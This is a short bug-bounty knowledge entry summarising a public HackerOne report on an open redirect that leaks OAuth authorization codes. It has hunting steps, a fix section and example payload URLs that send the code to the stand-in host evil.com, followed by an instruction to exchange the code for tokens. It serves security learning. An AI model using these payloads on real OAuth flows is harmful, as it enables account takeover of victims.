---
name: open-redirect-oauth-code
description: Open redirect in an OAuth flow leaking the authorization code. Teaches how redirect issues in OAuth/Social-login endpoints become code/token theft and how to detect + exploit them.
sources: hackerone_public
report_count: 1
---

# Open Redirect → OAuth Authorization Code Exposure

**Report**: LY Corporation — "page.line.me Open Redirect Leading to OAuth Authorization Code Exposure" (hackerone.com/reports/3423013, high, $1,000).

## Why it matters (the new lesson)
OAuth providers send the `code`/`state` to the `redirect_uri` after login. If the *redirect endpoint itself* can be influenced to bounce to your domain, the `code` travels with it. No direct `redirect_uri` tampering is needed — just an open redirect **after** the OAuth callback.

## How it works
```
1. Victim clicks: https://oauth.target/authorize?client_id=...&redirect_uri=https://target/cb&state=x
2. target/cb does: location.href = user-controlled "next" param  (open redirect)
3. Victim lands on: https://evil.com/?code=<AUTH_CODE>&state=x
```
Attacker exchanges `code` (within its TTL) for tokens → account access.

## How to hunt for it
1. Map the OAuth/social-login flow; note the `redirect_uri` and any `next`/`return`/`state`-adjacent redirect param.
2. Confirm the callback endpoint has an open redirect.
3. Prove the `code` lands on your domain (check logs); exchange it.

## Payloads
```
https://target/cb?next=https://evil.com
https://target/cb?redirect=https://evil.com
```

## Fix
No redirect param in OAuth callbacks (or strict allowlist); bind `code` to `redirect_uri` (RFC 6749) + PKCE + `state` validation; short code TTL, single-use.
